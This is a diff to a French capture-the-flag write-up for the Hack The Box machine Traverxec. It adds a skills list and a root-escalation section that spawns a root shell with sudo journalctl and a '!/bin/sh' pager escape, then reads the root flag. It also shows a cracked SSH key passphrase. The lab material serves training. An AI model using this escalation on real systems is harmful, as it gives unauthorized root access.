@@ -5,8 +5,11 @@ Traverxec est une box Linux dont l'adresse IP est 10.10.10.165.</br>
 
 Compétences mises en oeuvre :</br>
 * Enumération des ports et services d'une machine distante.
-
-
+* Enumération des dossiers et fichiers d'un site web.
+* Identifier site web vulnérable.
+* Recherche et exploitation d'un exploit.
+* Utilisation de id_rsa pour se connecter sans mot de passe.
+* Elévation de privilège via une commande en sudo.
 </br>
 
 # Enumération initiale
@@ -102,4 +105,23 @@ passphrase : hunter
 ![Pic14](../img/traverxec14.PNG?raw=true) </br>
 
 # Obtenir un accès root
-Le secret pour les elévation de privilège, c'est l'énumération. 
+Dans le /home de david, un dossier bin est présent, il contient :
+```bash
+$ cd bin
+$ ls -aril
+```
+![Pic15](../img/traverxec15.PNG?raw=true) </br>
+Voici ce que contient les fichiers :
+```bash
+$ cat server-stats.head
+$ cat server-stats.sh
+```
+![Pic16](../img/traverxec16.PNG?raw=true) </br>
+Apparament, en tant que David, nous pouvons utiliser la commande journalctl avec sudo en gardant la syntaxe vu dans le fichier. Nous allons donc chercher sur le site GTFOBin un moyen d'obtenir un
+shell root avec la commande en sudo :
+```bash
+$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.services
+!/bin/sh
+# cat /root/root.txt
+```
+![Pic17](../img/traverxec17.PNG?raw=true) </br>
